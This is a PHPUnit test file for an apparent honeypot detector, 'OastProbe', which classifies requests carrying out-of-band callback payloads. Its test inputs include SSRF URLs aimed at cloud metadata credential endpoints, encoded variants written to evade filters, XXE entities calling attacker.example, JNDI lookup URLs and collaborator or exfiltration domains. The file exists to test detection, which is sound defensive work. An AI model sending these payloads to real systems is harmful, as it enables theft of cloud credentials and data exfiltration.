<?php

declare(strict_types=1);

namespace Funnypot\Core\Tests;

use Funnypot\Core\OastProbe;
use Funnypot\Core\RequestContext;
use PHPUnit\Framework\TestCase;

final class OastProbeTest extends TestCase
{
    public function test_detects_collaborator_zones_by_family(): void
    {
        $cases = [
            ['q=url=http://abc123.oastify.com/x', 'burp-collab'],
            ['q=http://x.burpcollaborator.net/', 'burp-collab'],
            ['q=http://cxyz.oast.fun/a', 'interactsh'],
            ['q=http://a.interact.sh/', 'interactsh'],
            ['q=http://a.dnslog.cn/', 'dnslog'],
            ['q=http://4232278668650001277.owasp.org/', 'zap-oast'],
            ['q=x.PEN-1-2.dns.collabp-reg4.devops.aws.dev', 'aws-collab'],
            ['q=x.PEN-9.dns.collabp-reg7.devops.aws.dev', 'aws-collab'],
            ['q=url=http://169.254.169.254/latest/meta-data/iam/', 'cloud-metadata'],
            ['q=url=http://metadata.google.internal/computeMetadata/v1/', 'cloud-metadata'],
        ];
        foreach ($cases as [$query, $expected]) {
            $r = new RequestContext('GET', '/', $query);
            self::assertSame($expected, OastProbe::detect($r), "query: {$query}");
        }
    }

    public function test_detects_zone_in_any_request_field(): void
    {
        // Referer header only.
        self::assertSame('burp-collab', OastProbe::detect(
            new RequestContext('GET', '/', '', ['Referer' => 'http://z.oastify.com/'])
        ));
        // User-Agent only.
        self::assertSame('interactsh', OastProbe::detect(
            new RequestContext('GET', '/', '', ['User-Agent' => 'probe http://q.oast.pro/'])
        ));
        // POST body (XXE external entity).
        self::assertSame('burp-collab', OastProbe::detect(
            new RequestContext('POST', '/', '', [], '<!ENTITY x SYSTEM "http://e.oastify.com/">')
        ));
        // URL-encoded query (SSRF to IMDS).
        self::assertSame('cloud-metadata', OastProbe::detect(
            new RequestContext('GET', '/', 'url=http%3A%2F%2F169.254.169.254%2Flatest%2F')
        ));
        // Path segment.
        self::assertSame('interactsh', OastProbe::detect(
            new RequestContext('GET', '/redirect/http://p.interact.sh/')
        ));
    }

    public function test_false_positive_guards(): void
    {
        // Plain benign request.
        self::assertNull(OastProbe::detect(new RequestContext('GET', '/', 'q=hello', ['User-Agent' => 'curl/8.0'])));
        // A legit OWASP link (no long numeric label) must not match zap-oast.
        self::assertNull(OastProbe::detect(new RequestContext('GET', '/', '', ['Referer' => 'https://owasp.org/www-project-zap/'])));
        self::assertNull(OastProbe::detect(new RequestContext('GET', '/', '', ['User-Agent' => 'links (www.owasp.org)'])));
        // The dot-prefix (left-edge) guard: a domain that merely ends in the zone word must not match.
        self::assertNull(OastProbe::detect(new RequestContext('GET', '/', 'q=http://x.roast.fun/')));
        // The right-edge guard: a live gTLD that merely STARTS with a collaborator zone must not
        // match (`.oast.fund`, `.interact.shop`, `.interact.show`, `.oast.melbourne` are real,
        // plausible legit domains — not interactsh hosts).
        self::assertNull(OastProbe::detect(new RequestContext('GET', '/', 'u=https://x.oast.fund/')));
        self::assertNull(OastProbe::detect(new RequestContext('GET', '/', '', ['Referer' => 'https://www.interact.shop/checkout'])));
        self::assertNull(OastProbe::detect(new RequestContext('GET', '/', 'u=https://app.interact.show/')));
        self::assertNull(OastProbe::detect(new RequestContext('GET', '/', 'ref=https://my.oast.melbourne.example/')));
    }

    public function test_boundary_clean_hit_beside_a_benign_superset_still_fires(): void
    {
        // A right-edge-guarded superset (`.oast.fund`) earlier in the haystack must NOT mask a real
        // boundary-clean collaborator hit (`.oast.fun/`) later — the matcher scans every occurrence.
        self::assertSame('interactsh', OastProbe::detect(
            new RequestContext('GET', '/', 'a=https://x.oast.fund/&b=https://real.oast.fun/')
        ));
        // Zone at end-of-haystack (no trailing char) is still a clean boundary.
        self::assertSame('interactsh', OastProbe::detect(
            new RequestContext('GET', '/', 'u=abc.oast.fun')
        ));
    }

    public function test_payload_past_the_cap_is_not_scanned(): void
    {
        // Documents the 16KB cap: a zone buried past it in the body is not matched.
        $body = str_repeat('A', 16400) . 'http://late.oastify.com/';
        self::assertNull(OastProbe::detect(new RequestContext('POST', '/', '', [], $body)));
    }

    public function test_zone_in_header_detected_despite_16kb_junk_body(): void
    {
        // The FP-0256 cap-ordering fix: a >=16KB junk body must NOT push a header-borne OAST zone
        // past the scan cap. Header-first ordering scans the Referer before the body, so the zone
        // survives. (Fails on the pre-FP-0256 body-first builder, where the header was truncated.)
        $body = str_repeat('A', 16400);
        self::assertSame('burp-collab', OastProbe::detect(
            new RequestContext('POST', '/', '', ['Referer' => 'http://abc.oastify.com/'], $body)
        ));
    }

    // --- FP-0257: multi-decode evasion regressions (payload evades single-decode, caught after) ---

    public function test_double_encoded_imds_detected(): void
    {
        // E2: a double-encoded IMDS URL survived the single rawurldecode pass. The bounded
        // multi-decode peels both layers, so 169.254.169.254 surfaces.
        $r = new RequestContext('GET', '/', 'url=http%253A%252F%252F169%252e254%252e169%252e254%252flatest%252f');
        self::assertSame('cloud-metadata', OastProbe::detect($r));
    }

    public function test_double_encoded_zone_detected(): void
    {
        // E2b: double-encoded collaborator-zone dots.
        $r = new RequestContext('GET', '/', 'u=http://abc%252eoastify%252ecom/');
        self::assertSame('burp-collab', OastProbe::detect($r));
    }

    // --- FP-0257: new-coverage families ---

    public function test_detects_new_zones_by_family(): void
    {
        $cases = [
            ['q=http://x.bxss.me/', 'blind-xss'],                       // subdomained (ZONES)
            ['q=http://bxss.me/t/xss.js', 'blind-xss'],                 // bare/path-style (PATTERNS)
            ['q=http://x.r87.me/', 'blind-xss'],
            ['q=http://abc.canarytokens.com/', 'canarytokens'],
            ['q=https://webhook.site/8f0e-uuid', 'webhook-exfil'],      // bare/path-style (PATTERNS)
            ['q=https://5f2a.webhook.site/', 'webhook-exfil'],          // subdomained (ZONES)
        ];
        foreach ($cases as [$query, $expected]) {
            $r = new RequestContext('GET', '/', $query);
            self::assertSame($expected, OastProbe::detect($r), "query: {$query}");
        }
    }

    public function test_detects_metadata_endpoint_additions(): void
    {
        self::assertSame('cloud-metadata', OastProbe::detect(
            new RequestContext('GET', '/', 'url=http://169.254.170.2/v2/credentials/')
        ));
        self::assertSame('cloud-metadata', OastProbe::detect(
            new RequestContext('GET', '/', 'url=http://168.63.129.16/machine?comp=goalstate')
        ));
    }

    public function test_detects_imds_ip_encoding_variants(): void
    {
        $cases = [
            'url=http://2852039166/latest/',                 // decimal 0xA9FEA9FE
            'url=http://0xa9fea9fe/latest/',                 // hex
            'url=http://0xa9.0xfe.0xa9.0xfe/latest/',        // per-octet hex
            'url=http://0251.0376.0251.0376/latest/',        // octal
            'url=http://[::ffff:a9fe:a9fe]/latest/',         // IPv6-mapped
        ];
        foreach ($cases as $query) {
            $r = new RequestContext('GET', '/', $query);
            self::assertSame('cloud-metadata', OastProbe::detect($r), "query: {$query}");
        }
    }

    public function test_xxe_oob_external_entity_detected(): void
    {
        self::assertSame('xxe-oob', OastProbe::detect(
            new RequestContext('POST', '/', '', [], '<!ENTITY % x SYSTEM "http://attacker.example/x">')
        ));
        self::assertSame('xxe-oob', OastProbe::detect(
            new RequestContext('POST', '/', '', [], "<!ENTITY x SYSTEM 'ftp://attacker.example/x'>")
        ));
    }

    public function test_jndi_scheme_families_detected(): void
    {
        $cases = [
            'p={"a":"rmi://x.example/Obj"}',
            'p=ldap://x.example/Basic',
            'p=iiop://x.example/',
        ];
        foreach ($cases as $query) {
            $r = new RequestContext('GET', '/', $query);
            self::assertSame('jndi-oob', OastProbe::detect($r), "query: {$query}");
        }
    }

    public function test_dns_rebinding_zone_detected(): void
    {
        $cases = [
            'q=http://a.7f000001.1time.nip.io/',
            'q=http://x.sslip.io/',
            'q=http://x.rbndr.us/',
        ];
        foreach ($cases as $query) {
            $r = new RequestContext('GET', '/', $query);
            self::assertSame('dns-rebinding', OastProbe::detect($r), "query: {$query}");
        }
    }

    public function test_imds_wins_over_rebinding_zone(): void
    {
        // Severity-descending scan (§2.4g): a rebinding-style IMDS probe reports the CRITICAL
        // cloud-metadata family, not the MEDIUM dns-rebinding hint, even though the host ends in a
        // rebinding zone.
        self::assertSame('cloud-metadata', OastProbe::detect(
            new RequestContext('GET', '/', 'q=http://169.254.169.254.nip.io/latest/')
        ));
    }

    // --- FP-0257: new false-positive guards (benign values must NOT be flagged) ---

    public function test_new_zone_false_positive_guards(): void
    {
        $cases = [
            'q=http://nipiodocs.example/',                              // no dot-prefixed .nip.io
            'q=http://x.nip.io.example/',                              // rebinding zone not the registrable domain (strict right edge)
            'q=http://r87.men/',                                       // r87.me right-edge guard
            'q=http://bxss.mesh/',                                     // bxss.me right-edge guard
            'q=https://example.com/blog/what-is-a-webhook-site-guide', // 'webhook-site' (hyphen), not 'webhook.site'
            'url=http://168.63.129.167/',                             // Azure guard: 168.63/16 is routable
            'id=12852039166',                                          // decimal-IMDS digit-run guard
            'hex=0xa9fea9fe1',                                         // hex-IMDS right-run guard (N2)
            'p=mailto://x.example/',                                   // jndi-oob: not an ldap/rmi/iiop scheme
            'p=httpldap://x.example/',                                 // jndi-oob left-boundary guard
        ];
        foreach ($cases as $query) {
            $r = new RequestContext('GET', '/', $query);
            self::assertNull(OastProbe::detect($r), "query: {$query}");
        }

        // A DOCTYPE with a legit w3.org DTD system-id (no <!ENTITY) must NOT flag xxe-oob.
        self::assertNull(OastProbe::detect(new RequestContext(
            'POST', '/', '', [],
            '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">'
        )));
    }
}
